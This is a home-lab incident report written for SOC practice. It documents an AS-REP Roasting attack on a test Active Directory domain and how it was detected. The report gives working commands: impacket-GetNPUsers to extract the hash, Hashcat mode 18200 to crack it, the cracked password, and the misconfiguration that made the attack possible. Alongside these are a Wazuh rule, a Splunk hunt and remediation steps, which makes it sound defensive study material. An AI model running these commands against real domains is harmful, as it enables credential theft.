# Incident AD-04: AS-REP Roasting — Offline Credential Theft via Disabled Pre-Authentication

**Investigation ID:** AD-04
**Date:** July 2026
**Analyst:** Shakshi
**Lab Environment:** SOC.LAB (SOC Home Lab — VirtualBox)
**MITRE ATT&CK Techniques:** T1558.004 (Steal or Forge Kerberos Tickets: AS-REP Roasting), TA0006 (Credential Access)

---

## 1. Executive Summary

A simulated attacker exploited a Kerberos pre-authentication misconfiguration on the `jsmith` account (`DoesNotRequirePreAuth = True`) to request an AS-REP ticket from the domain controller without supplying any credentials. The returned ticket is encrypted with the user's password hash, making it crackable offline. Using Impacket's `GetNPUsers` tool and Hashcat (mode 18200), the attacker extracted the `$krb5asrep$23$...` hash for `jsmith@SOC.LAB` and recovered the plaintext password `Password123!!` in under 10 seconds against `rockyou.txt`.

AS-REP Roasting is distinct from Kerberoasting (AD-02) in a critical way: it requires **zero prior credentials**. An unauthenticated attacker with network access to the domain controller on port 88 can enumerate vulnerable accounts and extract crackable hashes without ever authenticating to the domain. Detection centers on Event ID 4768 (Kerberos TGT Request) with `preAuthType = 0`, which is the precise indicator that pre-authentication was skipped — a custom Wazuh rule (ID 100030) and a Splunk SPL hunt were deployed to catch this.

## 2. Timeline of Events

| Time | Event |
|---|---|
| Pre-attack | `jsmith` account configured with `DoesNotRequirePreAuth = True` via PowerShell on DC01 |
| T+0:00 | Attacker creates `users.txt` on Kali-Attacker containing target username `jsmith` |
| T+0:00 | `impacket-GetNPUsers SOC.LAB/ -usersfile users.txt -dc-ip 192.168.10.10 -no-pass` executes |
| T+0:00 | DC01 returns AS-REP encrypted with jsmith's password hash — no credential check performed |
| T+0:00 | Hash saved to `asrep.hash` in `$krb5asrep$23$jsmith@SOC.LAB:...` format |
| T+0:00 | Wazuh rule 100030 fires: Event ID 4768 with preAuthType 0 detected |
| T+0:09 | `hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt` recovers: `Password123!!` |
| T+0:09 | Hash cracked at 74.83% through rockyou.txt (10.7M of 14.3M candidates processed) |

## 3. Attack Methodology

**Tools:** Impacket (`GetNPUsers`), Hashcat

### Phase 1 — Identify and exploit the pre-authentication misconfiguration

The vulnerability was introduced via PowerShell on DC01:
```powershell
Set-ADAccountControl -Identity jsmith -DoesNotRequirePreAuth $true
```

This sets the `DONT_REQ_PREAUTH` flag in the `UserAccountControl` attribute of the `jsmith` AD object. Any user or unauthenticated party can now request a TGT for `jsmith` without proving identity.

**Attack execution from Kali-Attacker (192.168.10.5):**
```bash
echo "jsmith" > users.txt
impacket-GetNPUsers SOC.LAB/ -usersfile users.txt -dc-ip 192.168.10.10 -no-pass -format hashcat -o asrep.hash
cat asrep.hash
```

The `-no-pass` flag is the key differentiator from Kerberoasting — no domain credentials are supplied at all. DC01 responds with a valid AS-REP because `DONT_REQ_PREAUTH` is set, and the response body is encrypted with a key derived from the user's password hash.

**Hash output:**
```
$krb5asrep$23$jsmith@SOC.LAB:<hash>
```

### Phase 2 — Offline cracking

```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt --force
hashcat -m 18200 asrep.hash --show
```

Mode `18200` is Hashcat's Kerberos 5, etype 23 AS-REP cracking mode (RC4-HMAC). Recovered credential:
```
jsmith : Password123!!
```

Cracked in 9 seconds at 1138.6 kH/s — 10.7 million candidates tested before finding the match.

**Why this works:** Kerberos pre-authentication exists specifically to prevent this. Without it, the DC issues a ticket encrypted with the user's password hash on request, with no proof of identity required. The attacker never interacts with the domain again — all cracking is done offline, bypassing lockout policies, network monitoring, and any active defense.

**MITRE ATT&CK mapping:**
- **T1558.004 — Steal or Forge Kerberos Tickets: AS-REP Roasting**
- **TA0006 — Credential Access** (tactic)

## 4. Log Evidence

**Event ID 4768 — Kerberos TGT Request with Pre-Auth Type 0:**

The critical detection field is `preAuthType = 0`, meaning no pre-authentication was required or provided. In a correctly configured domain, this field should always be `2` (encrypted timestamp) for user accounts.

**Custom Wazuh detection rule (fired):**
```xml
<!-- DETECTION: AS-REP Roasting Anomaly -->
<rule id="100030" level="10">
    <if_sid>60103</if_sid>
    <field name="win.system.eventID">^4768$</field>
    <field name="win.eventdata.preAuthType">^0$</field>
    <field name="win.eventdata.targetUserName">!.*\$$</field>
    <description>AD Security: AS-REP Roasting attempt detected — Kerberos TGT issued without pre-authentication for a user account.</description>
    <group>credential_access,mitre_t1558.004</group>
</rule>
```

The `!.*\$` exclusion filters out machine accounts (which legitimately end in `$`), reducing false positives to near-zero in a well-maintained domain.

**Splunk SPL hunt for AS-REP anomalies:**
```spl
index=main sourcetype=_json "data.win.system.eventID"=4768
    "data.win.eventdata.preAuthType"=0
| table _time data.win.system.computer data.win.eventdata.targetUserName data.win.eventdata.ipAddress
| rename data.win.system.computer as DC
         data.win.eventdata.targetUserName as TargetUser
         data.win.eventdata.ipAddress as SourceIP
```

Expected result: `jsmith` from `192.168.10.5` with `preAuthType = 0` — the exact AS-REP Roasting fingerprint.

**Screenshot references:**

### Attack
- `attack/asrep-hash-extracted.png` — impacket-GetNPUsers output and `cat asrep.hash` showing `$krb5asrep$23$jsmith@SOC.LAB:...`
- `attack/hashcat-asrep-cracked.png` — Hashcat mode 18200 result showing `Password123!!` recovered in 9 seconds

### Detection
- `detection/splunk-4768-preauth0.png` — Splunk SPL output showing jsmith AS-REP request with preAuthType 0 from Kali attacker IP

## 5. Network Evidence

A single Kerberos AS-REQ/AS-REP exchange occurred on TCP/UDP port 88 between 192.168.10.5 (Kali-Attacker) and 192.168.10.10 (DC01.SOC.LAB). Unlike a brute force, this generates exactly **one** successful event — no failed attempts, no lockout, no noise. *(Reference `pcaps/asrep-roasting.pcap` here if a capture was taken, and note the absence of a preceding AS-REQ timestamp field in the request body, which is the packet-level indicator of a pre-auth-disabled request.)*

## 6. IOC Table

| Indicator | Value | Notes |
|---|---|---|
| Attacker host | 192.168.10.5 (Kali-Attacker) | Origin of AS-REP request |
| Vulnerable account | jsmith@SOC.LAB | `DoesNotRequirePreAuth = True` |
| Misconfiguration flag | `DONT_REQ_PREAUTH` | Set in UserAccountControl attribute |
| Hash type | `$krb5asrep$23$` | Kerberos 5 AS-REP etype 23 (RC4-HMAC) |
| Cracked password | Password123!! | Recovered via Hashcat mode 18200 in 9s |
| Detection event | Event ID 4768, preAuthType=0 | Fired Wazuh rule 100030 |
| Credentials required | None | Attacker had zero prior domain access |

## 7. Root Cause

The `jsmith` account was explicitly configured with `DoesNotRequirePreAuth = True`, disabling the Kerberos pre-authentication requirement. This is a deliberate configuration change (not a default) that should never be applied to standard user accounts — it exists for legacy application compatibility only, and its use on any account should be treated as a security exception requiring explicit business justification and compensating controls.

## 8. Impact Assessment

**Severity: High**

The attack recovered valid domain credentials (`jsmith : Password123!!`) with zero prior access to the domain — not even a guest account was needed. In a real environment, an attacker on the same network segment as the domain controller could enumerate all accounts with pre-auth disabled using tools like `ldapdomaindump` or BloodHound (which flags `DONT_REQ_PREAUTH` accounts in its analysis), then request and crack hashes for all of them in a single pass. This represents a zero-credential-to-domain-user escalation path.

## 9. Recommendations

1. **Audit and remediate all accounts with `DoesNotRequirePreAuth = True`** immediately. Run `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth` to enumerate them. There should be zero user accounts with this flag set in a modern domain.
2. **Enforce AES encryption for Kerberos** domain-wide (`msDS-SupportedEncryptionTypes`). AES-encrypted AS-REP hashes are crackable in principle but orders of magnitude slower than RC4 — a strong password policy becomes much more effective as a compensating control.
3. **Deploy Wazuh rule 100030** (see Log Evidence section) or equivalent to alert on any 4768 event with `preAuthType = 0` from a non-machine account.
4. **Enable fine-grained audit policy** for Kerberos Service Ticket Operations on all domain controllers to ensure 4768 events are generated and forwarded to the SIEM.
5. **Enforce strong password policy** for all accounts — a 15+ character random password with complexity requirements makes offline cracking impractical even if an AS-REP hash is extracted.

## 10. Lessons Learned

The most striking aspect of AS-REP Roasting is what it doesn't require: no domain credentials, no foothold, no exploitation. It is a pure misconfiguration attack where the administrator has voluntarily removed a security control. This makes it almost impossible to prevent through network controls alone — the DC is behaving correctly according to its configuration. Detection must therefore happen at the event level (4768 + preAuthType=0), and prevention happens at configuration management (no account should carry `DONT_REQ_PREAUTH` without an explicit, documented, time-bounded exception).

Comparing this with Kerberoasting (AD-02) is instructive: Kerberoasting requires valid credentials to request a TGS, whereas AS-REP Roasting requires nothing. From a defender's perspective this makes AS-REP Roasting the higher-priority misconfiguration to fix — the blast radius begins at the network perimeter, not at the credential theft stage.
